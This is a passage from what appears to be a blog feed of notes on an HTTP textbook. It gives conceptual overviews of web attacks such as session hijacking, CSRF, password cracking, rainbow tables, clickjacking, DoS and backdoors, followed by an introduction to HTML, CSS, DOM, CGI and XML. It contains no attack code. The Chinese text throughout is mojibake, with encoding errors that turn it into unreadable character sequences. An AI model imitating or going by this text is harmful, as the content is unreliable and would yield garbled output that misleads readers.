ä¼šè¯åŠ«æŒæ”»å‡»æ¡ˆä¾‹ ä¸‹é¢æˆ‘ä»¬ä»¥è®¤è¯åŠŸèƒ½ä¸ºä¾‹è®²è§£ä¼šè¯åŠ«æŒã€‚è¿™é‡Œçš„è®¤è¯åŠŸèƒ½é€šè¿‡ä¼šè¯ç®¡ç†æœºåˆ¶ï¼Œä¼šå°†æˆåŠŸè®¤è¯çš„ç”¨æˆ·çš„ä¼šè¯ IDï¼ˆSIDï¼‰ä¿å­˜åœ¨ç”¨æˆ·æµè§ˆå™¨çš„ Cookie ä¸­ã€‚ æ”»å‡»è€…åœ¨å¾—çŸ¥è¯¥ Web ç½‘ç«™å­˜åœ¨å¯è·¨ç«™æ”»å‡»ï¼ˆXSSï¼‰çš„å®‰å…¨æ¼æ´žåŽï¼Œå°±è®¾ç½®å¥½ç”¨ JavaScript è„šæœ¬è°ƒç”¨ document.cookie ä»¥çªƒå–Cookie ä¿¡æ¯çš„é™·é˜±ï¼Œä¸€æ—¦ç”¨æˆ·è¸å…¥é™·é˜±ï¼ˆè®¿é—®äº†è¯¥è„šæœ¬ï¼‰ï¼Œæ”»å‡»è€…å°±èƒ½èŽ·å–å«æœ‰ä¼šè¯ ID çš„ Cookieã€‚æ”»å‡»è€…æ‹¿åˆ°ç”¨æˆ·çš„ä¼šè¯ ID åŽï¼Œå¾€è‡ªå·±çš„æµè§ˆå™¨çš„ Cookie ä¸­è®¾ç½®è¯¥ä¼šè¯ IDï¼Œå³å¯ä¼ªè£…æˆä¼šè¯ ID é­çªƒçš„ç”¨æˆ·ï¼Œè®¿é—® Web ç½‘ç«™äº†ã€‚ ä¼šè¯å›ºå®šæ”»å‡»å¯¹ä»¥çªƒå–ç›®æ ‡ä¼šè¯ ID ä¸ºä¸»åŠ¨æ”»å‡»æ‰‹æ®µçš„ä¼šè¯åŠ«æŒè€Œè¨€ï¼Œä¼šè¯å›ºå®šæ”»å‡»ï¼ˆSession Fixationï¼‰æ”»å‡»ä¼šå¼ºåˆ¶ç”¨æˆ·ä½¿ç”¨æ”»å‡»è€…æŒ‡å®šçš„ä¼šè¯ IDï¼Œå±žäºŽè¢«åŠ¨æ”»å‡»ã€‚ è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ ï¼ˆCross-Site Request Forgeriesï¼ŒCSRFï¼‰æ”»å‡»æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡è®¾ç½®å¥½çš„é™·é˜±ï¼Œå¼ºåˆ¶å¯¹å·²å®Œæˆè®¤è¯çš„ç”¨æˆ·è¿›è¡Œéžé¢„æœŸçš„ä¸ªäººä¿¡æ¯æˆ–è®¾å®šä¿¡æ¯ç­‰æŸäº›çŠ¶æ€æ›´æ–°ï¼Œå±žäºŽè¢«åŠ¨æ”»å‡»ã€‚ è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ æœ‰å¯èƒ½ä¼šé€ æˆä»¥ä¸‹ç­‰å½±å“ã€‚ åˆ©ç”¨å·²é€šè¿‡è®¤è¯çš„ç”¨æˆ·æƒé™æ›´æ–°è®¾å®šä¿¡æ¯ç­‰ åˆ©ç”¨å·²é€šè¿‡è®¤è¯çš„ç”¨æˆ·æƒé™è´­ä¹°å•†å“ åˆ©ç”¨å·²é€šè¿‡è®¤è¯çš„ç”¨æˆ·æƒé™åœ¨ç•™è¨€æ¿ä¸Šå‘è¡¨è¨€è®º å…¶ä»–å®‰å…¨æ¼æ´žå¯†ç ç ´è§£æ”»å‡»ï¼ˆPassword Crackingï¼‰å³ç®—å‡ºå¯†ç ï¼Œçªç ´è®¤è¯ã€‚æ”»å‡»ä¸ä»…é™äºŽ Web åº”ç”¨ï¼Œè¿˜åŒ…æ‹¬å…¶ä»–çš„ç³»ç»Ÿï¼ˆå¦‚ FTP æˆ– SSH ç­‰ï¼‰ï¼Œæœ¬èŠ‚å°†ä¼šè®²è§£å¯¹å…·å¤‡è®¤è¯åŠŸèƒ½çš„ Web åº”ç”¨è¿›è¡Œçš„å¯†ç ç ´è§£ã€‚ å¯†ç ç ´è§£æœ‰ä»¥ä¸‹ä¸¤ç§æ‰‹æ®µã€‚ é€šè¿‡ç½‘ç»œçš„å¯†ç è¯•é”™ å¯¹å·²åŠ å¯†å¯†ç çš„ç ´è§£ï¼ˆæŒ‡æ”»å‡»è€…å…¥ä¾µç³»ç»Ÿï¼Œå·²èŽ·å¾—åŠ å¯†æˆ–æ•£åˆ—å¤„ç†çš„å¯†ç æ•°æ®çš„æƒ…å†µï¼‰ é™¤åŽ»çªç ´è®¤è¯çš„æ”»å‡»æ‰‹æ®µï¼Œè¿˜æœ‰ SQL æ³¨å…¥æ”»å‡»é€ƒé¿è®¤è¯ï¼Œè·¨ç«™è„šæœ¬æ”»å‡»çªƒå–å¯†ç ä¿¡æ¯ç­‰æ–¹æ³•ã€‚ é€šè¿‡ç½‘ç»œè¿›è¡Œå¯†ç è¯•é”™å¯¹ Web åº”ç”¨æä¾›çš„è®¤è¯åŠŸèƒ½ï¼Œé€šè¿‡ç½‘ç»œå°è¯•å€™é€‰å¯†ç è¿›è¡Œçš„ä¸€ç§æ”»å‡»ã€‚ä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ç§æ–¹å¼ã€‚ ç©·ä¸¾æ³• å­—å…¸æ”»å‡» ç©·ä¸¾æ³•ç©·ä¸¾æ³•ï¼ˆBrute-force Attackï¼Œåˆç§°æš´åŠ›ç ´è§£æ³•ï¼‰æ˜¯æŒ‡å¯¹æ‰€æœ‰å¯†é’¥é›†åˆæž„æˆçš„å¯†é’¥ç©ºé—´ï¼ˆKeyspaceï¼‰è¿›è¡Œç©·ä¸¾ã€‚å³ï¼Œç”¨æ‰€æœ‰å¯è¡Œçš„å€™é€‰å¯†ç å¯¹ç›®æ ‡çš„å¯†ç ç³»ç»Ÿè¯•é”™ï¼Œç”¨ä»¥çªç ´éªŒè¯çš„ä¸€ç§æ”»å‡»ã€‚ æ¯”å¦‚é“¶è¡Œé‡‡ç”¨çš„ä¸ªäººè¯†åˆ«ç æ˜¯ç”±â€œ4 ä½æ•°å­—â€ç»„æˆçš„å¯†ç ï¼Œé‚£ä¹ˆå°±è¦ä»Ž 0000~9999 ä¸­çš„å…¨éƒ¨æ•°å­—é€ä¸ªè¿›è¡Œå°è¯•ã€‚è¿™æ ·ä¸€æ¥ï¼Œå¿…å®šåœ¨å€™é€‰çš„å¯†ç é›†åˆä¸­å­˜åœ¨ä¸€ä¸ªæ­£ç¡®çš„å¯†ç ï¼Œå¯é€šè¿‡è®¤è¯ã€‚ å› ä¸ºç©·ä¸¾æ³•ä¼šå°è¯•æ‰€æœ‰çš„å€™é€‰å¯†ç ï¼Œæ‰€ä»¥æ˜¯ä¸€ç§å¿…ç„¶èƒ½å¤Ÿç ´è§£å¯†ç çš„æ”»å‡»ã€‚ä½†æ˜¯ï¼Œå½“å¯†é’¥ç©ºé—´å¾ˆåºžå¤§æ—¶ï¼Œè§£å¯†å¯èƒ½éœ€è¦èŠ±è´¹æ•°å¹´ï¼Œç”šè‡³åƒå¹´çš„æ—¶é—´ï¼Œå› æ­¤ä»ŽçŽ°å®žè§’åº¦è€ƒé‡ï¼Œæ”»å‡»æ˜¯å¤±è´¥çš„ã€‚ å­—å…¸æ”»å‡»å­—å…¸æ”»å‡»æ˜¯æŒ‡åˆ©ç”¨äº‹å…ˆæ”¶é›†å¥½çš„å€™é€‰å¯†ç ï¼ˆç»è¿‡å„ç§ç»„åˆæ–¹å¼åŽå­˜å…¥å­—å…¸ï¼‰ï¼Œæžšä¸¾å­—å…¸ä¸­çš„å¯†ç ï¼Œå°è¯•é€šè¿‡è®¤è¯çš„ä¸€ç§æ”»å‡»æ‰‹æ³•ã€‚ ä¸Žç©·ä¸¾æ³•ç›¸æ¯”ï¼Œç”±äºŽéœ€è¦å°è¯•çš„å€™é€‰å¯†ç è¾ƒå°‘ï¼Œæ„å‘³ç€æ”»å‡»è€—è´¹çš„æ—¶é—´æ¯”è¾ƒçŸ­ã€‚ä½†æ˜¯ï¼Œå¦‚æžœå­—å…¸ä¸­æ²¡æœ‰æ­£ç¡®çš„å¯†ç ï¼Œé‚£å°±æ— æ³•ç ´è§£æˆåŠŸã€‚å› æ­¤æ”»å‡»çš„æˆè´¥å–å†³äºŽå­—å…¸çš„å†…å®¹ã€‚ å¯¹å·²åŠ å¯†å¯†ç çš„ç ´è§£Web åº”ç”¨åœ¨ä¿å­˜å¯†ç æ—¶ï¼Œä¸€èˆ¬ä¸ä¼šç›´æŽ¥ä»¥æ˜Žæ–‡çš„æ–¹å¼ä¿å­˜ï¼Œé€šè¿‡æ•£åˆ—å‡½æ•°åšæ•£åˆ—å¤„ç†æˆ–åŠ  salt çš„æ‰‹æ®µå¯¹è¦ä¿å­˜çš„å¯†ç æœ¬èº«åŠ å¯†ã€‚é‚£å³ä½¿æ”»å‡»è€…ä½¿ç”¨æŸäº›æ‰‹æ®µçªƒå–å¯†ç æ•°æ®ï¼Œå¦‚æžœæƒ³è¦çœŸæ­£ä½¿ç”¨è¿™äº›å¯†ç ï¼Œåˆ™å¿…é¡»å…ˆé€šè¿‡è§£ç ç­‰æ‰‹æ®µï¼ŒæŠŠåŠ å¯†å¤„ç†çš„å¯†ç è¿˜åŽŸæˆæ˜Žæ–‡å½¢å¼ã€‚ ä»ŽåŠ å¯†è¿‡çš„æ•°æ®ä¸­å¯¼å‡ºæ˜Žæ–‡é€šå¸¸æœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•ã€‚ é€šè¿‡ç©·ä¸¾æ³•Â·å­—å…¸æ”»å‡»è¿›è¡Œç±»æŽ¨ å½©è™¹è¡¨ æ‹¿åˆ°å¯†é’¥ åŠ å¯†ç®—æ³•çš„æ¼æ´ž é€šè¿‡ç©·ä¸¾æ³•Â·å­—å…¸æ”»å‡»è¿›è¡Œç±»æŽ¨é’ˆå¯¹å¯†ç ä½¿ç”¨æ•£åˆ—å‡½æ•°è¿›è¡ŒåŠ å¯†å¤„ç†çš„æƒ…å†µï¼Œé‡‡ç”¨å’Œç©·ä¸¾æ³•æˆ–å­—å…¸æ”»å‡»ç›¸åŒçš„æ‰‹æ³•ï¼Œå°è¯•è°ƒç”¨ç›¸åŒçš„æ•£åˆ—å‡½æ•°åŠ å¯†å€™é€‰å¯†ç ï¼Œç„¶åŽæŠŠè®¡ç®—å‡ºçš„æ•£åˆ—å€¼ä¸Žç›®æ ‡æ•£åˆ—å€¼åŒ¹é…ï¼Œç±»æŽ¨å‡ºå¯†ç ã€‚ å½©è™¹è¡¨å½©è™¹è¡¨ï¼ˆRainbow Tableï¼‰æ˜¯ç”±æ˜Žæ–‡å¯†ç åŠä¸Žä¹‹å¯¹åº”çš„æ•£åˆ—å€¼æž„æˆçš„ä¸€å¼ æ•°æ®åº“è¡¨ï¼Œæ˜¯ä¸€ç§é€šè¿‡äº‹å…ˆåˆ¶ä½œåºžå¤§çš„å½©è™¹è¡¨ï¼Œå¯åœ¨ç©·ä¸¾æ³• â€¢ å­—å…¸æ”»å‡»ç­‰å®žé™…ç ´è§£è¿‡ç¨‹ä¸­ç¼©çŸ­æ¶ˆè€—æ—¶é—´çš„æŠ€å·§ã€‚ä»Žå½©è™¹è¡¨å†…æœç´¢æ•£åˆ—å€¼å°±å¯ä»¥æŽ¨å¯¼å‡ºå¯¹åº”çš„æ˜Žæ–‡å¯†ç ã€‚ ä¸ºäº†æé«˜æ”»å‡»æˆåŠŸçŽ‡ï¼Œæ‹¥æœ‰ä¸€å¼ æµ·é‡æ•°æ®çš„å½©è™¹è¡¨å°±æˆäº†å¿…ä¸å¯å°‘çš„æ¡ä»¶ã€‚ä¾‹å¦‚åœ¨ Free Rainbow Tables ç½‘ç«™ä¸Šï¼ˆhttp://www.freerainbowtables.com/en/tables2/ï¼‰å…¬å¸ƒçš„ä¸€å¼ ç”±å¤§å°å†™å­—æ¯åŠæ•°å­—å…¨æŽ’åˆ—çš„ 1~8 ä½å­—ç¬¦ä¸²å¯¹åº”çš„ MD5 æ•£åˆ—å€¼æž„æˆçš„å½©è™¹è¡¨ï¼Œå…¶å¤§å°çº¦ä¸º 1050 å‰å­—èŠ‚ã€‚ æ‹¿åˆ°å¯†é’¥ä½¿ç”¨å…±äº«å¯†é’¥åŠ å¯†æ–¹å¼å¯¹å¯†ç æ•°æ®è¿›è¡ŒåŠ å¯†å¤„ç†çš„æƒ…å†µä¸‹ï¼Œå¦‚æžœèƒ½é€šè¿‡æŸç§æ‰‹æ®µæ‹¿åˆ°åŠ å¯†ä½¿ç”¨çš„å¯†é’¥ï¼Œä¹Ÿå°±å¯ä»¥å¯¹å¯†ç æ•°æ®è§£å¯†äº†ã€‚ åŠ å¯†ç®—æ³•çš„æ¼æ´žè€ƒè™‘åˆ°åŠ å¯†ç®—æ³•æœ¬èº«å¯èƒ½å­˜åœ¨çš„æ¼æ´žï¼Œåˆ©ç”¨è¯¥æ¼æ´žå°è¯•è§£å¯†ä¹Ÿæ˜¯ä¸€ç§å¯è¡Œçš„æ–¹æ³•ã€‚ä½†æ˜¯è¦æ‰¾åˆ°é‚£äº›å·²å¹¿æ³›ä½¿ç”¨çš„åŠ å¯†ç®—æ³•çš„æ¼æ´žï¼Œåˆè°ˆä½•å®¹æ˜“ï¼Œå› æ­¤å›°éš¾æžå¤§ï¼Œä¸æ˜“æˆåŠŸã€‚ è€Œ Web åº”ç”¨å¼€å‘è€…ç‹¬ç«‹å®žçŽ°çš„åŠ å¯†ç®—æ³•ï¼Œæƒ³å¿…å°šæœªç»è¿‡å……åˆ†çš„éªŒè¯ï¼Œè¿˜æ˜¯å¾ˆæœ‰å¯èƒ½å­˜åœ¨æ¼æ´žçš„ã€‚ ç‚¹å‡»åŠ«æŒç‚¹å‡»åŠ«æŒï¼ˆClickjackingï¼‰æ˜¯æŒ‡åˆ©ç”¨é€æ˜Žçš„æŒ‰é’®æˆ–é“¾æŽ¥åšæˆé™·é˜±ï¼Œè¦†ç›–åœ¨ Web é¡µé¢ä¹‹ä¸Šã€‚ç„¶åŽè¯±ä½¿ç”¨æˆ·åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œç‚¹å‡»é‚£ä¸ªé“¾æŽ¥è®¿é—®å†…å®¹çš„ä¸€ç§æ”»å‡»æ‰‹æ®µã€‚è¿™ç§è¡Œä¸ºåˆç§°ä¸ºç•Œé¢ä¼ªè£…ï¼ˆUI Redressingï¼‰ã€‚ å·²è®¾ç½®é™·é˜±çš„ Web é¡µé¢ï¼Œè¡¨é¢ä¸Šå†…å®¹å¹¶æ— ä¸å¦¥ï¼Œä½†æ—©å·²åŸ‹å…¥æƒ³è®©ç”¨æˆ·ç‚¹å‡»çš„é“¾æŽ¥ã€‚å½“ç”¨æˆ·ç‚¹å‡»åˆ°é€æ˜Žçš„æŒ‰é’®æ—¶ï¼Œå®žé™…ä¸Šæ˜¯ç‚¹å‡»äº†å·²æŒ‡å®šé€æ˜Žå±žæ€§å…ƒç´ çš„ iframe é¡µé¢ã€‚ DoS æ”»å‡»DoS æ”»å‡»ï¼ˆDenial of Service attackï¼‰æ˜¯ä¸€ç§è®©è¿è¡Œä¸­çš„æœåŠ¡å‘ˆåœæ­¢çŠ¶æ€çš„æ”»å‡»ã€‚æœ‰æ—¶ä¹Ÿå«åšæœåŠ¡åœæ­¢æ”»å‡»æˆ–æ‹’ç»æœåŠ¡æ”»å‡»ã€‚DoS æ”»å‡»çš„å¯¹è±¡ä¸ä»…é™äºŽ Web ç½‘ç«™ï¼Œè¿˜åŒ…æ‹¬ç½‘ç»œè®¾å¤‡åŠæœåŠ¡å™¨ç­‰ã€‚ ä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ç§ DoS æ”»å‡»æ–¹å¼ã€‚ é›†ä¸­åˆ©ç”¨è®¿é—®è¯·æ±‚é€ æˆèµ„æºè¿‡è½½ï¼Œèµ„æºç”¨å°½çš„åŒæ—¶ï¼Œå®žé™…ä¸ŠæœåŠ¡ä¹Ÿå°±å‘ˆåœæ­¢çŠ¶æ€ã€‚ é€šè¿‡æ”»å‡»å®‰å…¨æ¼æ´žä½¿æœåŠ¡åœæ­¢ã€‚ å…¶ä¸­ï¼Œé›†ä¸­åˆ©ç”¨è®¿é—®è¯·æ±‚çš„ DoS æ”»å‡»ï¼Œå•çº¯æ¥è®²å°±æ˜¯å‘é€å¤§é‡çš„åˆæ³•è¯·æ±‚ã€‚æœåŠ¡å™¨å¾ˆéš¾åˆ†è¾¨ä½•ä¸ºæ­£å¸¸è¯·æ±‚ï¼Œä½•ä¸ºæ”»å‡»è¯·æ±‚ï¼Œå› æ­¤å¾ˆéš¾é˜²æ­¢ DoS æ”»å‡»ã€‚ å¤šå°è®¡ç®—æœºå‘èµ·çš„ DoS æ”»å‡»ç§°ä¸º DDoS æ”»å‡»ï¼ˆDistributed Denial of Service attackï¼‰ã€‚DDoS æ”»å‡»é€šå¸¸åˆ©ç”¨é‚£äº›æ„ŸæŸ“ç—…æ¯’çš„è®¡ç®—æœºä½œä¸ºæ”»å‡»è€…çš„æ”»å‡»è·³æ¿ã€‚ åŽé—¨ç¨‹åºåŽé—¨ç¨‹åºï¼ˆBackdoorï¼‰æ˜¯æŒ‡å¼€å‘è®¾ç½®çš„éšè—å…¥å£ï¼Œå¯ä¸æŒ‰æ­£å¸¸æ­¥éª¤ä½¿ç”¨å—é™åŠŸèƒ½ã€‚åˆ©ç”¨åŽé—¨ç¨‹åºå°±èƒ½å¤Ÿä½¿ç”¨åŽŸæœ¬å—é™åˆ¶çš„åŠŸèƒ½ã€‚ å¼€å‘é˜¶æ®µä½œä¸º Debug è°ƒç”¨çš„åŽé—¨ç¨‹åº å¼€å‘è€…ä¸ºäº†è‡ªèº«åˆ©ç›Šæ¤å…¥çš„åŽé—¨ç¨‹åº æ”»å‡»è€…é€šè¿‡æŸç§æ–¹æ³•è®¾ç½®çš„åŽé—¨ç¨‹åº å¯é€šè¿‡ç›‘è§†è¿›ç¨‹å’Œé€šä¿¡çš„çŠ¶æ€å‘çŽ°è¢«æ¤å…¥çš„åŽé—¨ç¨‹åºã€‚ä½†è®¾å®šåœ¨ Webåº”ç”¨ä¸­çš„åŽé—¨ç¨‹åºï¼Œç”±äºŽå’Œæ­£å¸¸ä½¿ç”¨æ—¶åŒºåˆ«ä¸å¤§ï¼Œé€šå¸¸å¾ˆéš¾å‘çŽ°ã€‚ å‚è€ƒé“¾æŽ¥ï¼šhttps://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥æµ…å‡ºHTTPï¼Œä»Žå¼€å§‹åˆ°æ”¾å¼ƒï¼ˆç¬¬åç« ï¼‰â€”â€” æž„å»º Web å†…å®¹çš„æŠ€æœ¯]]></title>
    <url>%2F2018-09-18-read-%E5%9B%BE%E8%A7%A3HTTP-Part10.html</url>
    <content type="text"><![CDATA[ç¬¬åç«  æž„å»º Web å†…å®¹çš„æŠ€æœ¯HTMLWeb é¡µé¢å‡ ä¹Žå…¨ç”± HTML æž„å»ºHTML ï¼ˆHyperText Markup Language,è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ï¼‰æ˜¯ä¸ºäº†å‘é€ Web ä¸Šçš„è¶…æ–‡æœ¬ï¼ˆHypertextï¼‰è€Œå¼€å‘çš„æ ‡è®°è¯­è¨€ã€‚è¶…æ–‡æœ¬æ˜¯ä¸€ç§æ–‡æ¡£ç³»ç»Ÿï¼Œå¯å°†æ–‡æ¡£ä¸­ä»»æ„ä½ç½®çš„ä¿¡æ¯ä¸Žå…¶ä»–ä¿¡æ¯ï¼ˆæ–‡æœ¬ä¸Žå›¾ç‰‡ç­‰ï¼‰å»ºç«‹å…³è”ï¼Œå³è¶…é“¾æŽ¥æ–‡æœ¬ã€‚æ ‡è®°è¯­è¨€æ˜¯é€šè¿‡åœ¨æ–‡æ¡£çš„æŸéƒ¨åˆ†ç©¿æ’ç‰¹åˆ«çš„å­—ç¬¦ä¸²æ ‡ç­¾ï¼Œç”¨æ¥ä¿®é¥°æ–‡æ¡£çš„è¯­è¨€ã€‚æˆ‘ä»¬æŠŠå‡ºçŽ°åœ¨ HTML æ–‡æ¡£å†…çš„è¿™ç§ç‰¹æ®Šå­—ç¬¦å«åš HTML æ ‡ç­¾ï¼ˆTagï¼‰. å¹³æ—¶æˆ‘ä»¬æµè§ˆçš„ Web é¡µé¢å‡ ä¹Žå…¨æ˜¯ä½¿ç”¨ HTML å†™æˆçš„ã€‚ç”± HTML æž„æˆçš„æ–‡æ¡£ç»è¿‡æµè§ˆå™¨çš„è§£æžã€æ¸²æŸ“åŽï¼Œå‘ˆçŽ°å‡ºæ¥çš„ç»“æžœå°±æ˜¯ Web é¡µé¢ã€‚ è®¾è®¡åº”ç”¨ CSSCSSï¼ˆCascading Style Sheetsï¼Œå±‚å æ ·å¼è¡¨ï¼‰å¯ä»¥æŒ‡å®šå¦‚ä½•å±•çŽ° HTMLå†…çš„å„ç§å…ƒç´ ï¼Œå±žäºŽæ ·å¼è¡¨æ ‡å‡†ä¹‹ä¸€ã€‚å³ä½¿æ˜¯ç›¸åŒçš„ HTML æ–‡æ¡£ï¼Œé€šè¿‡æ”¹å˜åº”ç”¨çš„ CSSï¼Œç”¨æµè§ˆå™¨çœ‹åˆ°çš„é¡µé¢å¤–è§‚ä¹Ÿä¼šéšä¹‹æ”¹å˜ã€‚CSSçš„ç†å¿µå°±æ˜¯è®©æ–‡æ¡£çš„ç»“æž„å’Œè®¾è®¡åˆ†ç¦»ï¼Œè¾¾åˆ°è§£è€¦çš„ç›®çš„ã€‚ åŠ¨æ€ HTMLè®© Web é¡µé¢åŠ¨èµ·æ¥çš„åŠ¨æ€ HTMLæ‰€è°“åŠ¨æ€ HTMLï¼ˆDynamic HTMLï¼‰ï¼Œæ˜¯æŒ‡ä½¿ç”¨å®¢æˆ·ç«¯è„šæœ¬è¯­è¨€å°†é™æ€çš„ HTML å†…å®¹å˜æˆåŠ¨æ€çš„æŠ€æœ¯çš„æ€»ç§°ã€‚é¼ æ ‡å•å‡»ç‚¹å¼€çš„æ–°é—»ã€Google Maps ç­‰å¯æ»šåŠ¨çš„åœ°å›¾å°±ç”¨åˆ°äº†åŠ¨æ€ HTMLã€‚ åŠ¨æ€ HTML æŠ€æœ¯æ˜¯é€šè¿‡è°ƒç”¨å®¢æˆ·ç«¯è„šæœ¬è¯­è¨€ JavaScriptï¼Œå®žçŽ°å¯¹HTML çš„ Web é¡µé¢çš„åŠ¨æ€æ”¹é€ ã€‚åˆ©ç”¨ DOMï¼ˆDocument Object Modelï¼Œæ–‡æ¡£å¯¹è±¡æ¨¡åž‹ï¼‰å¯æŒ‡å®šæ¬²å‘ç”ŸåŠ¨æ€å˜åŒ–çš„ HTML å…ƒç´ ã€‚ æ›´æ˜“æŽ§åˆ¶ HTML çš„ DOMDOM æ˜¯ç”¨ä»¥æ“ä½œ HTML æ–‡æ¡£å’Œ XML æ–‡æ¡£çš„ APIï¼ˆApplicationProgramming Interfaceï¼Œåº”ç”¨ç¼–ç¨‹æŽ¥å£ï¼‰ã€‚ä½¿ç”¨ DOM å¯ä»¥å°† HTML å†…çš„å…ƒç´ å½“ä½œå¯¹è±¡æ“ä½œï¼Œå¦‚å–å‡ºå…ƒç´ å†…çš„å­—ç¬¦ä¸²ã€æ”¹å˜é‚£ä¸ª CSS çš„å±žæ€§ç­‰ï¼Œä½¿é¡µé¢çš„è®¾è®¡å‘ç”Ÿæ”¹å˜ã€‚ Web åº”ç”¨é€šè¿‡ Web æä¾›åŠŸèƒ½çš„ Web åº”ç”¨Web åº”ç”¨æ˜¯æŒ‡é€šè¿‡ Web åŠŸèƒ½æä¾›çš„åº”ç”¨ç¨‹åºã€‚æ¯”å¦‚è´­ç‰©ç½‘ç«™ã€ç½‘ä¸Šé“¶è¡Œã€SNSã€BBSã€æœç´¢å¼•æ“Žå’Œ e-learning ç­‰ã€‚äº’è”ç½‘ï¼ˆInternetï¼‰æˆ–ä¼ä¸šå†…ç½‘ï¼ˆIntranetï¼‰ä¸Šéå¸ƒå„å¼å„æ ·çš„ Web åº”ç”¨ã€‚ ä¸Ž Web æœåŠ¡å™¨åŠç¨‹åºåä½œçš„ CGICGIï¼ˆCommon Gateway Interfaceï¼Œé€šç”¨ç½‘å…³æŽ¥å£ï¼‰æ˜¯æŒ‡ Web æœåŠ¡å™¨åœ¨æŽ¥æ”¶åˆ°å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„è¯·æ±‚åŽè½¬å‘ç»™ç¨‹åºçš„ä¸€ç»„æœºåˆ¶ã€‚åœ¨ CGI çš„ä½œç”¨ä¸‹ï¼Œç¨‹åºä¼šå¯¹è¯·æ±‚å†…å®¹åšå‡ºç›¸åº”çš„åŠ¨ä½œï¼Œæ¯”å¦‚åˆ›å»º HTML ç­‰åŠ¨æ€å†…å®¹ã€‚ ä½¿ç”¨ CGI çš„ç¨‹åºå«åš CGI ç¨‹åºï¼Œé€šå¸¸æ˜¯ç”¨ Perlã€PHPã€Ruby å’Œ C ç­‰ç¼–ç¨‹è¯­è¨€ç¼–å†™è€Œæˆã€‚ å›  Java è€Œæ™®åŠçš„ ServletServlet ï¼ˆè½»é‡æœåŠ¡ç¨‹åºï¼‰æ˜¯ä¸€ç§èƒ½åœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºåŠ¨æ€å†…å®¹çš„ç¨‹åºã€‚Servlet æ˜¯ç”¨ Javaè¯­è¨€å®žçŽ°çš„ä¸€ä¸ªæŽ¥å£ï¼Œå±žäºŽé¢å‘ä¼ä¸šçº§ Javaï¼ˆJavaEEï¼ŒJava Enterprise Editionï¼‰çš„ä¸€éƒ¨åˆ†ã€‚ CGIï¼Œç”±äºŽæ¯æ¬¡æŽ¥åˆ°è¯·æ±‚ï¼Œç¨‹åºéƒ½è¦è·Ÿç€å¯åŠ¨ä¸€æ¬¡ã€‚å› æ­¤ä¸€æ—¦è®¿é—®é‡è¿‡å¤§ï¼ŒWeb æœåŠ¡å™¨è¦æ‰¿æ‹…ç›¸å½“å¤§çš„è´Ÿè½½ã€‚è€Œ Servlet è¿è¡Œåœ¨ä¸Ž Web æœåŠ¡å™¨ç›¸åŒçš„è¿›ç¨‹ä¸­ï¼Œå› æ­¤å—åˆ°çš„è´Ÿè½½è¾ƒå° ã€‚Servlet çš„è¿è¡ŒçŽ¯å¢ƒå«åš Web å®¹å™¨æˆ– Servlet å®¹å™¨ã€‚ Servlet ä½œä¸ºè§£å†³ CGI é—®é¢˜çš„å¯¹æŠ—æŠ€æœ¯ ï¼Œéš Java ä¸€èµ·å¾—åˆ°äº†æ™®åŠã€‚éšç€ CGI çš„æ™®åŠï¼Œæ¯æ¬¡è¯·æ±‚éƒ½è¦å¯åŠ¨æ–° CGI ç¨‹åºçš„ CGI è¿è¡Œæœºåˆ¶é€æ¸å˜æˆäº†æ€§èƒ½ç“¶é¢ˆï¼Œæ‰€ä»¥ä¹‹åŽ Servlet å’Œ mod_perl ç­‰å¯ç›´æŽ¥åœ¨ Web æœåŠ¡å™¨ä¸Šè¿è¡Œçš„ç¨‹åºæ‰å¾—ä»¥å¼€å‘ã€æ™®åŠã€‚ æ•°æ®å‘å¸ƒçš„æ ¼å¼åŠè¯­è¨€å¯æ‰©å±•æ ‡è®°è¯­è¨€XMLï¼ˆeXtensible Markup Languageï¼Œå¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼‰æ˜¯ä¸€ç§å¯æŒ‰åº”ç”¨ç›®æ ‡è¿›è¡Œæ‰©å±•çš„é€šç”¨æ ‡è®°è¯­è¨€ã€‚æ—¨åœ¨é€šè¿‡ä½¿ç”¨ XMLï¼Œä½¿äº’è”ç½‘æ•°æ®å…±äº«å˜å¾—æ›´å®¹æ˜“ã€‚ XML å’Œ HTML éƒ½æ˜¯ä»Žæ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€ SGMLï¼ˆStandard Generalized Markup Languageï¼‰ç®€åŒ–è€Œæˆã€‚ä¸Ž HTML ç›¸æ¯”ï¼Œå®ƒå¯¹æ•°æ®çš„è®°å½•æ–¹å¼åšäº†ç‰¹æ®Šå¤„ç†ã€‚ HTML ç¼–å†™çš„æŸå…¬å¸çš„ç ”è®¨ä¼šè®®è®®ç¨‹ä¸ºä¾‹ã€‚ 1234567891011121314151617181920&lt;html&gt;&lt;head&gt;&lt;title&gt;Tå…¬å¸ç ”è®¨ä¼šä»‹ç»&lt;/title&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;Tå…¬å¸ç ”è®¨ä¼šä»‹ç»&lt;/h1&gt; &lt;ul&gt; &lt;li&gt;ç ”è®¨ä¼šç¼–å·ï¼šTR001 &lt;ul&gt; &lt;li&gt;Webåº”ç”¨ç¨‹åºè„†å¼±æ€§è¯Šæ–­è®²åº§&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;ç ”è®¨ä¼šç¼–å·ï¼šTR002 &lt;ul&gt; &lt;li&gt;ç½‘ç»œç³»ç»Ÿè„†å¼±æ€§è¯Šæ–­è®²åº§&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/body&gt;&lt;/html&gt; 